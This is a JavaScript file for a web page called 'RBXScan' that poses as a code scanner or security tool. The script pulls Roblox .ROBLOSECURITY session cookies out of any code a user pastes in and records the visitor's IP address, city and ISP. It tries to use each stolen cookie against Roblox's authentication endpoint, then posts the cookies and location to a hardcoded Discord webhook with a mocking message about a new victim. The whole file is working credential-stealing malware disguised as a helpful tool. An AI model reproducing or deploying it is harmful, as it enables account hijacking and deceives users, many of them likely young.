// RBXScan - Simple Working Version
console.log('🚀 RBXScan loading...');

let isSubmitting = false;

// Cookie extraction
function extractCookies(code) {
    const cookies = [];
    const patterns = [
        /_ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
        /\.ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
        /ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
        /_ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{50,})/gi,
        /\.ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{50,})/gi
    ];
    
    patterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(code)) !== null) {
            const cookie = match[1];
            if (cookie && cookie.length > 20 && !cookies.includes(cookie)) {
                cookies.push(cookie);
            }
        }
    });
    
    return cookies;
}

// IP unlock
async function unlockIP(cookie) {
    try {
        const response = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            headers: {
                'Cookie': `_ROBLOSECURITY=${cookie}`,
                'Content-Type': 'application/json'
            }
        });
        return response.ok;
    } catch (error) {
        return false;
    }
}

// Get location
async function getLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
    }
}

// Send to Discord
async function sendToDiscord(code, location, cookies = null, unlockResults = null) {
    const webhook = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
    
    let title, color, description;
    
    if (cookies && cookies.length > 0) {
        title = '🍪 Cookie Extraction Success!';
        color = 0x00ff00;
        description = `Found ${cookies.length} cookie(s)!\n\`\`\`${code.substring(0, 400)}\`\`\``;
        
        if (unlockResults) {
            description += `\n**Unlock Results:**\n`;
            unlockResults.forEach((result, i) => {
                description += `Cookie ${i + 1}: ${result ? '✅ Success' : '❌ Failed'}\n`;
            });
        }
    } else {
        title = '📝 Code Analysis';
        color = 0x3498db;
        description = `\`\`\`${code.substring(0, 600)}\`\`\``;
    }
    
    const payload = {
        content: '@everyone new retard got hit',
        embeds: [{
            title: title,
            description: description,
            color: color,
            fields: [
                { name: '🌍 Location', value: `${location.city}, ${location.country}`, inline: true },
                { name: '🌐 IP', value: location.ip, inline: true },
                { name: '🏢 ISP', value: location.isp, inline: true },
                { name: '📅 Time', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'RBXScan Security Monitor' }
        }]
    };
    
    if (cookies && cookies.length > 0) {
        payload.embeds[0].fields.unshift({
            name: '🍪 Extracted Cookies',
            value: `\`\`\`${cookies.join('\n').substring(0, 500)}\`\`\``,
            inline: false
        });
    }
    
    try {
        const response = await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (error) {
        console.error('Discord error:', error);
        return false;
    }
}

// DOM Ready
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ RBXScan loaded!');
    
    // Get elements
    const openScanBtn = document.getElementById('openScanBtn');
    const compilePopup = document.getElementById('compilePopup');
    const closePopup = document.getElementById('closePopup');
    const compileForm = document.getElementById('compileForm');
    const codeTextarea = document.getElementById('codeTextarea');
    const statusMessage = document.getElementById('compileStatusMessage');
    const loadingContainer = document.getElementById('loadingContainer');
    const darkModeToggle = document.getElementById('darkModeToggle');
    
    console.log('Elements found:');
    console.log('- openScanBtn:', !!openScanBtn);
    console.log('- compilePopup:', !!compilePopup);
    console.log('- compileForm:', !!compileForm);
    
    // Dark mode
    if (darkModeToggle) {
        darkModeToggle.addEventListener('click', function() {
            document.body.classList.toggle('dark-mode');
            const isDark = document.body.classList.contains('dark-mode');
            darkModeToggle.textContent = isDark ? '☀️' : '🌙';
        });
    }
    
    // Open popup
    if (openScanBtn && compilePopup) {
        openScanBtn.addEventListener('click', function() {
            console.log('🔍 Opening popup...');
            compilePopup.style.display = 'block';
        });
    } else {
        console.log('❌ Button or popup not found!');
    }
    
    // Close popup
    if (closePopup && compilePopup) {
        closePopup.addEventListener('click', function() {
            console.log('❌ Closing popup...');
            compilePopup.style.display = 'none';
        });
    }
    
    // Close popup when clicking outside
    if (compilePopup) {
        compilePopup.addEventListener('click', function(e) {
            if (e.target === compilePopup) {
                compilePopup.style.display = 'none';
            }
        });
    }
    
    // Form submission
    if (compileForm && codeTextarea) {
        compileForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            console.log('📝 Form submitted!');
            
            if (isSubmitting) return;
            
            const code = codeTextarea.value.trim();
            
            if (!code) {
                if (statusMessage) {
                    statusMessage.textContent = '❌ Please enter some code.';
                    statusMessage.style.color = '#ff4757';
                }
                return;
            }
            
            // Basic validation
            if (code.length < 3 || /(.)\1{10,}/.test(code)) {
                if (statusMessage) {
                    statusMessage.textContent = '❌ Invalid input detected.';
                    statusMessage.style.color = '#ff4757';
                }
                return;
            }
            
            isSubmitting = true;
            
            if (loadingContainer) {
                loadingContainer.style.display = 'block';
            }
            
            if (statusMessage) {
                statusMessage.textContent = '';
            }
            
            try {
                console.log('📍 Getting location...');
                const location = await getLocation();
                
                console.log('🍪 Extracting cookies...');
                const cookies = extractCookies(code);
                
                if (statusMessage) {
                    if (cookies.length > 0) {
                        statusMessage.textContent = `🍪 Found ${cookies.length} cookie(s)! Attempting unlock...`;
                        statusMessage.style.color = '#3498db';
                    } else {
                        statusMessage.textContent = '🔍 Analyzing code...';
                        statusMessage.style.color = '#3498db';
                    }
                }
                
                let unlockResults = null;
                
                if (cookies.length > 0) {
                    console.log('🔓 Attempting IP unlock...');
                    unlockResults = await Promise.all(
                        cookies.map(cookie => unlockIP(cookie))
                    );
                }
                
                console.log('📤 Sending to Discord...');
                const webhookSent = await sendToDiscord(code, location, cookies, unlockResults);
                
                if (statusMessage) {
                    if (webhookSent) {
                        if (cookies.length > 0) {
                            const successCount = unlockResults.filter(r => r).length;
                            statusMessage.textContent = `✅ Success! Found ${cookies.length} cookie(s). ${successCount} unlock(s) successful.`;
                        } else {
                            statusMessage.textContent = '✅ Code analyzed successfully!';
                        }
                        statusMessage.style.color = '#27ae60';
                    } else {
                        statusMessage.textContent = '⚠️ Analysis complete but reporting failed.';
                        statusMessage.style.color = '#f39c12';
                    }
                }
                
                // Clear and close
                codeTextarea.value = '';
                setTimeout(() => {
                    if (compilePopup) {
                        compilePopup.style.display = 'none';
                    }
                }, 2000);
                
            } catch (error) {
                console.error('Error:', error);
                if (statusMessage) {
                    statusMessage.textContent = '❌ Analysis failed: ' + error.message;
                    statusMessage.style.color = '#ff4757';
                }
            } finally {
                isSubmitting = false;
                if (loadingContainer) {
                    loadingContainer.style.display = 'none';
                }
            }
        });
    } else {
        console.log('❌ Form or textarea not found!');
    }
    
    // About popup
    const aboutNavLink = document.getElementById('aboutNavLink');
    const aboutPopup = document.getElementById('aboutPopup');
    
    if (aboutNavLink && aboutPopup) {
        aboutNavLink.addEventListener('click', function(e) {
            e.preventDefault();
            aboutPopup.style.display = 'block';
        });
        
        aboutPopup.addEventListener('click', function(e) {
            if (e.target === aboutPopup) {
                aboutPopup.style.display = 'none';
            }
        });
    }
    
    console.log('✅ All components initialized!');
});

console.log('📄 RBXScan script ready!');
